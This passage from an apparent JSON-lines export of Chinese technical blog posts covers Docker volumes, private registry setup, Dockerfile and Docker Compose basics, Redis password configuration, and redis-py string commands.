数据卷注意事项</h1>\n\n<h2>数据卷使用注意</h2>\n\n<p>Docker的数据卷更多会是使用volumes方式来进行使用。使用时需注意：</p>\n\n<p>如果挂载一个空的数据卷到容器中的一个非空目录中，那么这个目录下的文件会被复制到数据卷中。</p>\n\n<p>如果挂载一个非空的数据卷到容器中的一个目录中，那么容器中的目录中会显示数据卷中的数据。</p>\n\n<p>如果原来容器中的目录中有数据，那么这些原始数据会被隐藏掉。</p>\n\n<p>这两个规则都非常重要，灵活利用第一个规则可以帮助我们初始化数据卷中的内容。掌握第二个规则可以保证挂载数据卷后的数据总是你期望的结果。</p>\n\n<h1>四、总结</h1>\n\n<h2>重点掌握</h2>\n\n<p>数据卷特征和简介</p>\n\n<p>mount方式绑定数据卷</p>\n\n<p>数据卷挂载的三种形式</p>\n\n<p>数据卷使用的注意事项</p>\n                                    </div>", "log_PostTime": 1584891108, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Docker核心技术之仓库", "log_Intro": "Docker核心技术之仓库", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1>一、Docker 仓库简介</h1>\n\n<h2>什么是Docker仓库</h2>\n\n<p>Docker仓库就是存放docker镜像并有docker pull方法下载的云环境</p>\n\n<p>Docker仓库分为公有仓库和私有仓库。</p>\n\n<p>公有仓库指Docker Hub(官方)等开放给用户使用、允许用户管理镜像。     </p>\n\n<p>私有仓库指由用户自行搭建的存放镜像的云环境。</p>\n\n<h1>二、Docker 私有仓库搭建</h1>\n\n<h2>搭建无认证私有仓库</h2>\n\n<p>第一步：在需要搭建仓库的服务器上安装docker。</p>\n\n<p>第二步：在服务器上，从docker hub下载registry仓库     docker pull registry</p>\n\n<p>第三步：在服务器上，启动仓库     </p>\n\n<p>              docker run -d -ti --restart always\\             </p>\n\n<p>                                        --name my-registry\\             </p>\n\n<p>                                        -p 8000:5000\\             </p>\n\n<p>                                        -v /my-registry/registry:/var/lib/registry\\      </p>\n\n<p>                                         registry     </p>\n\n<p>注意：registry内部对外开放端口是5000。默认情况下，会镜像存放于容器内的/var/lib/registry(官网Dockerfile中查看)目录下，这样如果容器被删除，则存放于容器中的镜像也会丢失。</p>\n\n<p>本地利用curl 服务器IP:8000/v2/_catalog  查看当前仓库中的存放的镜像列表。（注意打开8000端口访问）</p>\n\n<h2>私有仓库--上传、下载镜像</h2>\n\n<p>第一步：利用docker tag重命名需要上传的镜像</p>\n\n<p>              docker tag IMAGE 服务器IP:端口/IMAGE_NAME</p>\n\n<p>第二步：利用docker push上传刚刚重命名的镜像     </p>\n\n<p>              docker push 服务器IP:端口/centos</p>\n\n<p>注意：     必须重命名为服务器IP:端口/IMAGE_NAME     </p>\n\n<p>如果push出现了类似https的错误那么需要往配置文件/etc/docker/daemon.json里添加：”insecure-registries”:[“服务器IP:端口”]       然后重启docker。</p>\n\n<h2>搭建带认证的私有仓库（一）</h2>\n\n<p>在服务器上：  </p>\n\n<p>          第一步：删除先前创建的无认证的仓库容器         docker rm -f my-registry     </p>\n\n<p>          第二步：创建存放认证用户名和密码的文件：         mkdir /my-registry/auth -p     </p>\n\n<p>          第三步：创建密码验证文件。注意将将USERNAME和PASSWORD替换为设置的用户名和密码         </p>\n\n<p>         docker run --entrypoint htpasswd registry -Bbn USERNAME PASSWORD &gt; /my-registry/auth/htpasswd     </p>\n\n<p>          第四步：重新启动仓库镜像</p>\n\n<p>          docker run -d -p 8000:5000 --restart=always --name docker-registry \\</p>\n\n<p>          -v /my-registry/registry:/var/lib/registry \\</p>\n\n<p>          -v /my-registry/auth:/auth \\</p>\n\n<p>          -e \"REGISTRY_AUTH=htpasswd\" \\</p>\n\n<p>          -e \"REGISTRY_AUTH_HTPASSWD_REALM=Registry Realm\" \\</p>\n\n<p>          -e \"REGISTRY_AUTH_HTPASSWD_PATH=/auth/htpasswd\" \\</p>\n\n<p>          registry</p>\n\n<h2>带认证的私有仓库 -上传、下载镜像</h2>\n\n<p>在本地机器上：     </p>\n\n<p>          第一步：首先登录到服务器         </p>\n\n<p>          docker login -u username -p password 47.94.153.230:8000     </p>\n\n<p>          第二步：然后执行pull或者push命令     </p>\n\n<p>          第三步：操作完毕后，可以退出登录</p>\n\n<p>          docker logout 47.94.153.230:8000</p>\n\n<p>这是如果想查看仓库中已有的镜像，那么需要进行http验证才可以。可以直接借助浏览器访问47.94.153.230:8000/v2/_catalog就可以访问了</p>\n\n<p>注意这里：47.94.153.230指服务器IP</p>\n\n<h1>三、总结</h1>\n\n<p>重点掌握： 私有仓库搭建（安全）</p>\n                                    </div>", "log_PostTime": 1584891109, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Docker核心技术之Dockerfile", "log_Intro": "Docker核心技术之Dockerfile", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1>一、Dockerfile简介</h1>\n\n<p>Dockerfile其实就是根据特定的语法格式撰写出来的一个普通的文本文件 利用docker build命令依次执行在Dockerfile中定义的一系列命令，最终生成一个新的镜像（定制镜像）</p>\n\n<h1>二、Dockerfile 示例与使用</h1>\n\n<p><strong>Dockerfile参考示例</strong></p>\n\n<p><img alt=\"\" class=\"has\" height=\"73\" src=\"https://img-blog.csdnimg.cn/20190502092218524.png\" width=\"785\"></p>\n\n<p><img alt=\"\" class=\"has\" height=\"138\" src=\"https://img-blog.csdnimg.cn/20190502092241853.png\" width=\"785\"></p>\n\n<p><img alt=\"\" class=\"has\" height=\"185\" src=\"https://img-blog.csdnimg.cn/20190502092412638.png\" width=\"785\"></p>\n\n<p><strong>Dockerfile使用演示 – docker build</strong></p>\n\n<p><img alt=\"\" class=\"has\" height=\"429\" src=\"https://img-blog.csdnimg.cn/20190502092456342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"554\"></p>\n\n<p><strong>Dockerfile使用命令 – docker build</strong></p>\n\n<p>作用：     根据dockerfile创建镜像</p>\n\n<p>命令格式：     docker build [OPTIONS] PATH | URL | -</p>\n\n<p>命令参数：     PATH        Dockerfile所在路径(文件夹路径)，文件名必须是Dockerfile     </p>\n\n<p>                       URL        Dockerfile所在URL地址          </p>\n\n<p>                       OPTIONS:         -t, --tag list        为镜像设置名称和tag         </p>\n\n<p>                                                 -f, --file string        指定Dockerfile的路径(这是可以使用其他名称命名Dockerfile)</p>\n\n<h1><strong>三、Dockerfile 特征</strong></h1>\n\n<p><strong>Dockerfile 构建特征（一）</strong></p>\n\n<p>查看官方的Dockerfile：https://github.com/docker-library/docs</p>\n\n<p><img alt=\"\" class=\"has\" height=\"357\" src=\"https://img-blog.csdnimg.cn/20190502102328231.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"564\"></p>\n\n<p><strong>Dockerfile 构建特征（二）</strong></p>\n\n<p>Dockerfile必须具备一个FROM命令来进行构建</p>\n\n<p>每一个Dockerfile命令都会构建一层镜像（本质上是每一层都会启动一个容器，执行完命令后，将容器进行提交后，产生新的镜像层）</p>\n\n<p>通过查看下载下来的镜像，发现历史层信息的层ID是missing，其实是因为原本的层id只存在于构建镜像的宿主机上，一旦转移镜像后，历史层消息中将只保留最新一层的ID</p>\n\n<h1>四、Dockerfile 命令概述</h1>\n\n<p><strong>Dockerfile 命令概述（一）</strong></p>\n\n<p><a href=\"https://docs.docker.com/engine/reference/builder/#usage\" rel=\"nofollow\">查看完整介绍</a></p>\n\n<p>FROM: 指定基础镜像</p>\n\n<p>RUN： 构建镜像过程中需要执行的命令。可以有多条。docker build</p>\n\n<p>CMD：添加启动容器时需要执行的命令。多条只有最后一条生效。可以在启动容器时被覆盖和修改。</p>\n\n<p>ENTRYPOINT：同CMD，但这个一定会被执行，不会被覆盖修改。</p>\n\n<p>MLABELAINTAINER：表明镜像的作者。将被遗弃，被LABEL代替。</p>\n\n<p>EXPOSE：设置对外暴露的端口。</p>\n\n<p>ENV：设置执行命令时的环境变量，并且在构建完成后，仍然生效</p>\n\n<p>ARG：设置只在构建过程中使用的环境变量，构建完成后，将消失</p>\n\n<p>ADD：将本地文件或目录拷贝到镜像的文件系统中。能解压特定格式文件，能将URL作为要拷贝的文件</p>\n\n<p>COPY：将本地文件或目录拷贝到镜像的文件系统中。</p>\n\n<p>VOLUME：添加数据卷</p>\n\n<p>USER：指定以哪个用户的名义执行RUN, CMD 和ENTRYPOINT等命令</p>\n\n<p>WORKDIR：设置工作目录</p>\n\n<p><strong>Dockerfile 命令概述（二）</strong></p>\n\n<p>ONBUILD：如果制作的镜像被另一个Dockerfile使用，将在那里被执行Docekrfile命令</p>\n\n<p>STOPSIGNAL：设置容器退出时发出的关闭信号。</p>\n\n<p>HEALTHCHECK：设置容器状态检查。</p>\n\n<p>SHELL：更改执行shell命令的程序。Linux的默认shell是[“/bin/sh”, “-c”]，Windows的是[“cmd”, “/S”, “/C”]。</p>\n\n<h1>五、总结</h1>\n\n<p>重点掌握： Docker 容器与镜像之间的关系（尤其commit命令的作用和效果）</p>\n\n<p>                   Dockerfile 的书写规则和使用规则</p>\n\n<p><img alt=\"\" class=\"has\" height=\"399\" src=\"https://img-blog.csdnimg.cn/20190502105704401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"630\"></p>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891110, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Docker核心技术之Docker Compose", "log_Intro": "Docker核心技术之Docker Compose", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1>一、Docker Compose 简介</h1>\n\n<h2>Docker Compose是什么？</h2>\n\n<p>Docker Compose是一个能一次性定义和管理多个Docker容器的工具。</p>\n\n<p><strong>详细地说： </strong>    </p>\n\n<p>Compose中定义和启动的每一个容器都相当于一个服务(service)     </p>\n\n<p>Compose中能定义和启动多个服务，且它们之间通常具有协同关系</p>\n\n<p><strong>管理方式：</strong></p>\n\n<p>使用YAML文件来配置我们应用程序的服务。     </p>\n\n<p>使用单个命令（docker-compose up），就可以创建并启动配置文件中配置的所有服务。</p>\n\n<h2>Docker Compose 工作原理</h2>\n\n<p><img alt=\"\" class=\"has\" height=\"381\" src=\"https://img-blog.csdnimg.cn/20190502154646524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"544\"></p>\n\n<h2>Docker Compose安装</h2>\n\n<p>Docker for Mac与Docker for Windows自带docker-compose</p>\n\n<p><strong>Linux下需要单独安装：</strong></p>\n\n<p>第一步：sudo curl -L https://github.com/docker/compose/releases/download/1.21.2/docker-compose-$(uname -s)-$(uname -m) -o /usr/local/bin/docker-compose</p>\n\n<p>第二步：sudo chmod +x /usr/local/bin/docker-compose 终端中使用docker-compose --version查看安装的版本 这里示例安装版本是1.21.2，很可能您看到这里时，已经出现更新的版本，因此建议换成最新版本。查看最新版本。</p>\n\n<p><a href=\"https://docs.docker.com/compose/install/#install-compose\" rel=\"nofollow\">其他安装方法查看</a></p>\n\n<h2><strong>Docker Compose CLI</strong></h2>\n\n<p>利用docker-compose --help查看或者<a href=\"https://docs.docker.com/compose/reference/overview/\" rel=\"nofollow\">查看官方文档 </a></p>\n\n<p>对比后会发现：Docker Compose CLI的很多命令的功能和Docker Client CLI是相似的。最主要的区别就是前者能一次性运行管理多个容器，后者只能一次管理一个。</p>\n\n<h1><strong>二、了解 Docker Compose File</strong></h1>\n\n<h2><strong>Docker Compose File版本</strong></h2>\n\n<p><a href=\"https://docs.docker.com/compose/compose-file/\" rel=\"nofollow\">Docker Compose File</a> 有多个版本，基本是向后兼容的，但也有极个别配置项高版本中没有。</p>\n\n<p>在docker-compose.yml一开始就需要利用version关键词标明当前file使用的版本</p>\n\n<p><img alt=\"\" class=\"has\" height=\"378\" src=\"https://img-blog.csdnimg.cn/20190502155553400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"605\"></p>\n\n<h2>Docker Compose File TOP配置参数概览</h2>\n\n<p>Docker Compose File 顶级配置项：</p>\n\n<p>version：指定Docker Compose File版本号</p>\n\n<p>services：定义多个服务并配置启动参数</p>\n\n<p>volumes：声明或创建在多个服务中共同使用的数据卷对象</p>\n\n<p>networks：定义在多个服务中共同使用的网络对象</p>\n\n<p>configs：声明将在本服务中要使用的一些配置文件</p>\n\n<p>secrets：声明将在本服务中要使用的一些秘钥、密码文件</p>\n\n<p>x-***：自定义配置。主要用于复用相同的配置。</p>\n\n<p><a href=\"https://docs.docker.com/compose/compose-file/#service-configuration-reference\" rel=\"nofollow\">更多详细配置</a></p>\n\n<h2>Docker Compose File 参考示例</h2>\n\n<p><img alt=\"\" class=\"has\" height=\"553\" src=\"https://img-blog.csdnimg.cn/2019050215580848.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"490\"></p>\n\n<h1>三、Docker Compose 应用</h1>\n\n<h2>Docker Compose 案例一   小型web服务项目搭建</h2>\n\n<p><strong>步骤：</strong></p>\n\n<p>搭建一个flask的小型web项目</p>\n\n<p>根据项目环境，利用Dockerfile构建镜像</p>\n\n<p>撰写docker-compose.yaml配置文件，启动项目</p>\n\n<h2>Docker Compose 案例二   单机环境ELK系统搭建（一）</h2>\n\n<h3><a href=\"https://www.elastic.co/guide/index.html\" rel=\"nofollow\">ELK</a>工作原理介绍</h3>\n\n<p><img alt=\"\" class=\"has\" height=\"310\" src=\"https://img-blog.csdnimg.cn/20190502160016342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"626\"></p>\n\n<h2>Docker Compose 案例二  单机环境ELK系统搭建（二）</h2>\n\n<p><strong>步骤： </strong></p>\n\n<p>配置单机版的docker-compose.yaml文件（<a href=\"https://www.docker.elastic.co/\" rel=\"nofollow\">ELK镜像地址</a>）</p>\n\n<p>利用docker-compose up启动环境</p>\n\n<h2>Docker Compose 案例三  多主机环境ELK系统搭建（一）</h2>\n\n<p><strong>Swarm 介绍</strong></p>\n\n<p><img alt=\"\" class=\"has\" height=\"352\" src=\"https://img-blog.csdnimg.cn/20190502160248890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"755\"></p>\n\n<h2><strong>Docker Compose 案例三  多主机环境ELK系统搭建（二）</strong></h2>\n\n<p><strong>集群版Docker Compose工作原理</strong></p>\n\n<p><img alt=\"\" class=\"has\" height=\"371\" src=\"https://img-blog.csdnimg.cn/20190502160319807.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"527\"></p>\n\n<h2><strong>Docker Compose 案例三  多主机环境ELK系统搭建（三）</strong></h2>\n\n<p><strong>步骤 </strong></p>\n\n<p>使用<a href=\"https://docs.docker.com/engine/reference/commandline/swarm/\" rel=\"nofollow\">docker swarm</a>配置多个docker node集群节点</p>\n\n<p>配置集群版ELK的docker-compose.yaml文件</p>\n\n<p>利用docker stack deploy部署集群版ELK环境</p>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891111, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "解决使用Dockerfile来build镜像时pip install遇到的BUG", "log_Intro": "解决使用Dockerfile来build镜像时pip install遇到的BUG", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>错误如下，遇到第二次了，<strong>而且看到网上很多回答并不管用</strong>，当然也可能是对应的问题不太相同。</p>\n\n<p>Collecting requests (from -r requirements.txt (line 1))</p>\n\n<p>  Retrying (Retry(total=4, connect=None, read=None, redirect=None)) after connection broken by 'NewConnectionError('&lt;pip._vendor.requests.packages.urllib3.connection.VerifiedHTTPSConnection object at 0x7f443a504350&gt;: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution',)': /simple/requests/<br>\n  Retrying (Retry(total=3, connect=None, read=None, redirect=None)) after connection broken by 'NewConnectionError('&lt;pip._vendor.requests.packages.urllib3.connection.VerifiedHTTPSConnection object at 0x7f443a504990&gt;: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution',)': /simple/requests/<br>\n  Retrying (Retry(total=2, connect=None, read=None, redirect=None)) after connection broken by 'NewConnectionError('&lt;pip._vendor.requests.packages.urllib3.connection.VerifiedHTTPSConnection object at 0x7f443a504390&gt;: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution',)': /simple/requests/<br>\n  Retrying (Retry(total=1, connect=None, read=None, redirect=None)) after connection broken by 'NewConnectionError('&lt;pip._vendor.requests.packages.urllib3.connection.VerifiedHTTPSConnection object at 0x7f443a504090&gt;: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution',)': /simple/requests/<br>\n  Retrying (Retry(total=0, connect=None, read=None, redirect=None)) after connection broken by 'NewConnectionError('&lt;pip._vendor.requests.packages.urllib3.connection.VerifiedHTTPSConnection object at 0x7f443a504a50&gt;: Failed to establish a new connection: [Errno -3] Temporary failure in name resolution',)': /simple/requests/</p>\n\n<p>解决方法：<strong>service docker restart</strong><br><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20190503091605497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n                                    </div>", "log_PostTime": 1584891112, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Redis数据库密码设置和查看密码", "log_Intro": "Redis数据库密码设置和查看密码", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>redis没有实现访问控制这个功能，但是它提供了一个轻量级的认证方式，可以编辑redis.conf配置来启用认证。</p>\n\n<p>   1、初始化Redis密码：</p>\n\n<p>   在配置文件中有个参数： requirepass  这个就是配置redis访问密码的参数；</p>\n\n<p>   比如 requirepass test123456；</p>\n\n<p>   （Ps:需重启Redis才能生效）</p>\n\n<p>   redis的查询速度是非常快的，外部用户一秒内可以尝试多大150K个密码；所以密码要尽量长（对于DBA 没有必要必须记住密码）；</p>\n\n<p>   2、不重启Redis设置密码：</p>\n\n<p>   在配置文件中配置requirepass的密码（当redis重启时密码依然有效）。</p>\n\n<p>   redis 127.0.0.1:6379&gt; config set requirepass test123456</p>\n\n<p>   查询密码：</p>\n\n<p>   redis 127.0.0.1:6379&gt; config get requirepass<br>\n   (error) ERR operation not permitted</p>\n\n<p>   密码验证：</p>\n\n<p>   redis 127.0.0.1:6379&gt; auth test123456<br>\n   OK</p>\n\n<p>   再次查询：</p>\n\n<p>   redis 127.0.0.1:6379&gt; config get requirepass<br>\n   1) \"requirepass\"<br>\n   2) \"test123456\"</p>\n\n<p>   PS：如果配置文件中没添加密码 那么redis重启后，密码失效；</p>\n\n<p>   3、登陆有密码的Redis：</p>\n\n<p>   在登录的时候的时候输入密码：</p>\n\n<p>   redis-cli -p 6379 -a test123456</p>\n\n<p>   先登陆后验证：</p>\n\n<p>   redis-cli -p 6379</p>\n\n<p>   redis 127.0.0.1:6379&gt; auth test123456<br>\n   OK</p>\n\n<p>   AUTH命令跟其他redis命令一样，是没有加密的；阻止不了攻击者在网络上窃取你的密码；</p>\n\n<p>   认证层的目标是提供多一层的保护。如果防火墙或者用来保护redis的系统防御外部攻击失败的话，外部用户如果没有通过密码认证还是无法访问redis的。</p>\n                                    </div>", "log_PostTime": 1584891113, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "python的redis数据库连接与使用", "log_Intro": "python的redis数据库连接与使用", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3>Redis</h3>\n\n<p>  redis是一个key-value<a href=\"http://baike.baidu.com/view/51839.htm\" rel=\"nofollow\">存储系统</a>。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(<a href=\"http://baike.baidu.com/view/549479.htm\" rel=\"nofollow\">链表</a>)、set(集合)、zset(sorted set --有序集合)和hash（哈希类型）。这些<a href=\"http://baike.baidu.com/view/675645.htm\" rel=\"nofollow\">数据类型</a>都 支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排 序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文 件，并且在此基础上实现了master-slave(主从)同步。</p>\n\n<p>一、Redis安装和基本使用</p>\n\n<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tbody><tr><td>\n\t\t\t<p>1</p>\n\n\t\t\t<p>2</p>\n\n\t\t\t<p>3</p>\n\n\t\t\t<p>4</p>\n\t\t\t</td>\n\t\t\t<td>\n\t\t\t<p><code>wget http:</code><code>/</code><code>/</code><code>download.redis.io</code><code>/</code><code>releases</code><code>/</code><code>redis</code><code>-</code><code>3.0</code><code>.</code><code>6.tar</code><code>.gz</code></p>\n\n\t\t\t<p><code>tar xzf redis</code><code>-</code><code>3.0</code><code>.</code><code>6.tar</code><code>.gz</code></p>\n\n\t\t\t<p><code>cd redis</code><code>-</code><code>3.0</code><code>.</code><code>6</code></p>\n\n\t\t\t<p><code>make</code></p>\n\t\t\t</td>\n\t\t</tr></tbody></table><p> 启动服务端</p>\n\n<pre>\nsrc/redis-server</pre>\n\n<p>启动客户端</p>\n\n<pre>\nsrc/redis-cli\nredis&gt; set foo bar\nOK\nredis&gt; get foo\n\"bar\"</pre>\n\n<p>二、Python操作Redis</p>\n\n<p> </p>\n\n<pre>\nsudo pip install redis\nor\nsudo easy_install redis\nor\n源码安装\n \n详见：https://github.com/WoLpH/redis-py</pre>\n\n<p> </p>\n\n<p>API使用</p>\n\n<p>redis-py 的API的使用可以分类为：</p>\n\n<ul><li>连接方式</li>\n\t<li>连接池</li>\n\t<li>操作\n\t<ul><li>String 操作</li>\n\t\t<li>Hash 操作</li>\n\t\t<li>List 操作</li>\n\t\t<li>Set 操作</li>\n\t\t<li>Sort Set 操作</li>\n\t</ul></li>\n\t<li>管道</li>\n\t<li>发布订阅</li>\n</ul><p>1、操作模式</p>\n\n<p>redis-py提供两个类Redis和StrictRedis用于实现Redis的命令，StrictRedis用于实现大部分官方的命令，并使用官方的语法和命令，Redis是StrictRedis的子类，用于向后兼容旧版本的redis-py。</p>\n\n<p> </p>\n\n<pre>\n#!/usr/bin/env python\n# -*- coding:utf-8 -*-\n \nimport redis\n \nr = redis.Redis(host='192.168.1.113', port=6379)\nr.set('foo', 'Bar')\nprint r.get('foo')</pre>\n\n<p> </p>\n\n<p>2、连接池</p>\n\n<p>redis-py使用connection pool来管理对一个redis server的所有连接，避免每次建立、释放连接的开销。默认，每个Redis实例都会维护一个自己的连接池。可以直接建立一个连接池，然后作为参数 Redis，这样就可以实现多个Redis实例共享一个连接池。</p>\n\n<p> </p>\n\n<pre>\n#!/usr/bin/env python\n# -*- coding:utf-8 -*-\n \nimport redis\n \npool = redis.ConnectionPool(host='192.168.1.113', port=6379)\n \nr = redis.Redis(connection_pool=pool)\nr.set('foo', 'Bar')\nprint r.get('foo')</pre>\n\n<p> </p>\n\n<p>3、操作</p>\n\n<p>String操作，redis中的String在在内存中按照一个name对应一个value来存储。如图：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"202\" src=\"https://images2015.cnblogs.com/blog/425762/201602/425762-20160222213200645-359371350.png\" width=\"312\"></p>\n\n<p> </p>\n\n<p><strong>set(name, value, ex=None, px=None, nx=False, xx=False)</strong></p>\n\n<p> </p>\n\n<pre>\n在Redis中设置值，默认，不存在则创建，存在则修改\n参数：\n     ex，过期时间（秒）\n     px，过期时间（毫秒）\n     nx，如果设置为True，则只有name不存在时，当前set操作才执行\n     xx，如果设置为True，则只有name存在时，岗前set操作才执行\n\nr.get(\"name\")  # 获取字段\nb'haha'\nr.set(\"name\", \"hehe\", ex=5)  # 保留时长 5秒\nr.get(\"name\")\nb'hehe'\nr.get(\"name\")\nr.set({'k1': 'v1', 'k2': 'v2'})  # 支持字典格式\nr.get(\"k1\")\nb'v1'</pre>\n\n<p> </p>\n\n<p><strong>mset(*args, **kwargs)</strong></p>\n\n<p> </p>\n\n<pre>\n# 批量设置\nr.mset(name=\"xixi\", age=18)\nr.get(\"name\")\nb'xixi'\nr.get(\"age\")\nb'18'</pre>\n\n<p> </p>\n\n<p><strong>mget(keys, *args)</strong></p>\n\n<pre>\n# 批量获取\nr.mset(name=\"xixi\", age=18)\nr.mget(\"name\", \"age\")\n[b'xixi', b'18']\nr.set(\"name\", \"koka\")</pre>\n\n<p><strong>getset(name, value)</strong></p>\n\n<pre>\n# 设置新值并获取原来的值\nr.getset(\"name\", \"akok\")\nb'koka'\nr.get(\"name\")\nb'akok'</pre>\n\n<p><strong>getrange(key, start, end)</strong></p>\n\n<p> </p>\n\n<pre>\n# 获取子序列（根据字节获取，非字符）\n# 参数：\n    # name，Redis 的 name\n    # start，起始位置（字节）\n    # end，结束位置（字节）\n# 如： \"武沛齐\" ，0-2表示 \"武\"\n\nr.set(\"parter\", \"柴少\")\nr.getrange(\"parter\", 0, 2).decode()\n'柴'</pre>\n\n<p> </p>\n\n<p><strong>setrange(name, offset, value)</strong></p>\n\n<p> </p>\n\n<pre>\n# 修改字符串内容，从指定字符串索引开始向后替换（新值太长时，则向后添加）\n# 参数：\n    # offset，字符串的索引，字节（一个汉字三个字节）\n    # value，要设置的值\n\nr.set(\"name\", 'ok')\n# 修改字符串内容，从指定字符串索引开始向后替换\nr.setrange(\"name\", 0, \"ko\")\nr.get(\"name\")\nb'ko'</pre>\n\n<p> </p>\n\n<p><strong>setbit(name, offset, value)</strong></p>\n\n<p> </p>\n\n<pre>\n# 对name对应值的二进制表示的位进行操作\n \n# 参数：\n    # name，redis的name\n    # offset，位的索引（将值变换成二进制后再进行索引）\n    # value，值只能是 1 或 0\n\nord('k')  # 107\nord('o')  # 111\n# 107 =&gt; 0 1 1 0 1 0 1 1\n# 111 =&gt; 0 1 1 0 1 1 1 1\nr.setbit(\"name\", 7, 0)\n# 0 1 1 0 1 0 1 1 =&gt; 0 1 1 0 1 0 1 0  106 =&gt; j\nr.get(\"name\")\nb'jo'\nr.setbit(\"name\", 15, 0)\n# 0 1 1 0 1 1 1 1 =&gt; 0 1 1 0 1 1 1 0  110 =&gt; n\nr.get(\"name\")\n<strong>b</strong><strong>'jn'</strong></pre>\n\n<p> </p>\n\n<p><strong>getbit(name, offset)</strong></p>\n\n<p> </p>\n\n<pre>\n# 获取name对应的值的二进制表示中的某位的值 （0或1）\nbin(ord('j')).replace('b', '')\n'01101010'\nbin(ord('n')).replace('b', '')\n'01101110'\nr.set(\"name\", \"jn\")\nr.getbit(\"name\", \"2\")\n1</pre>\n\n<p> </p>\n\n<p><strong>bitcount(key, start=None, end=None)</strong></p>\n\n<p> </p>\n\n<pre>\n# 获取name对应的值的二进制表示中 1 的个数\n# 参数：\n    # key，Redis的name\n    # start，位起始位置\n    # end，位结束位置\nr.bitcount(\"name\", 0, 1)\n9\nstr(bin(ord('j')) + bin(ord('n'))).replace('b', '').count(\"1\")\n9</pre>\n\n<p> </p>\n\n<p><strong>incr(self, name, amount=1)</strong></p>\n\n<p> </p>\n\n<pre>\n# 自增 name对应的值，当name不存在时，则创建name＝amount，否则，则自增。\n \n# 参数：\n    # name,Redis的name\n    # amount,自增数（必须是整数）\n \n# 注：同incrby\n\nr.set('n', 1)\nr.incr(\"n\", '3')\n4</pre>\n\n<p> </p>\n\n<p><strong>incrbyfloat(self, name, amount=1.0)</strong></p>\n\n<p> </p>\n\n<pre>\n# 自增 name对应的值，当name不存在时，则创建name＝amount，否则，则自增。\n \n# 参数：\n    # name,Redis的name\n    # amount,自增数（浮点型)\n\nr.incrbyfloat('n', 1)\n3.0</pre>\n\n<p> </p>\n\n<p><strong>decr(self, name, amount=1)</strong></p>\n\n<p> </p>\n\n<pre>\n# 自减 name对应的值，当name不存在时，则创建name＝amount，否则，则自减。\n \n# 参数：\n    # name,Redis的name\n    # amount,自减数（整数）\n\nr.set('n', '2')\nr.decr('n', 1)\n1</pre>\n\n<p> </p>\n\n<p><strong>append(key, value)</strong></p>\n\n<p> </p>\n\n<pre>\n# 在redis name对应的值后面追加内容\n \n# 参数：\n    key, redis的name\n    value, 要追加的字符串\nr.append('n', 'a')\n2\nr.get(\"n\")\nb'1a'</pre>\n\n<p> </p>\n\n<p>Hash操作，redis中Hash在内存中的存储格式如下图：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"232\" 